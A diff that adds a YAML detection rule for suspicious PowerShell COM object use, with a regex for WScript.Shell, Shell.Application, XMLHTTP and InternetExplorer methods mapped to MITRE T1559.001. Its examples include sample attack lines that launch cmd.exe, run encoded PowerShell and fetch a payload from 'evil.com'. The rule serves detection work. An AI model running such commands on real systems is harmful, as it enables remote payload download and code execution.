@@ -1,0 +1,40 @@
+# PowerShell Pattern: COM Object Abuse
+# Detects suspicious COM object usage with execution methods
+
+id: PS-013
+name: COM Object Abuse
+description: |
+  Detects COM object creation followed by execution or network methods. Simple
+  COM object instantiation may be legitimate. Pattern focuses on WScript.Shell.Run,
+  Shell.Application.ShellExecute, or XMLHTTP.open which indicate actual command
+  execution or network communication rather than just object creation.
+languages:
+  - powershell
+detection_type: regex
+# Focus on COM objects with execution methods - instantiation alone may be legitimate
+detection_logic: '(?i)(?:WScript\.Shell[^\n]*\.Run|Shell\.Application[^\n]*\.ShellExecute|MSXML2\.XMLHTTP[^\n]*\.open|InternetExplorer\.Application[^\n]*\.Navigate)'
+severity: Medium
+mitre_technique: T1559.001
+confidence: 0.85
+category: execution
+enabled: true
+paranoia_levels:
+  - 1
+  - 2
+  - 3
+metadata:
+  author: Script Sentinel Team
+  created: "2025-11-17"
+  updated: "2025-11-17"
+  references:
+    - "https://attack.mitre.org/techniques/T1559/001/"
+    - "https://docs.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal"
+  tags:
+    - powershell
+    - com-object
+    - execution
+    - lateral-movement
+  examples:
+    - "$shell = New-Object -ComObject WScript.Shell; $shell.Run('cmd.exe /c calc.exe')"
+    - "$http = New-Object -ComObject MSXML2.XMLHTTP; $http.open('GET', 'http://evil.com/payload', $false)"
+    - "$app = New-Object -ComObject Shell.Application; $app.ShellExecute('powershell.exe', '-enc ...')"
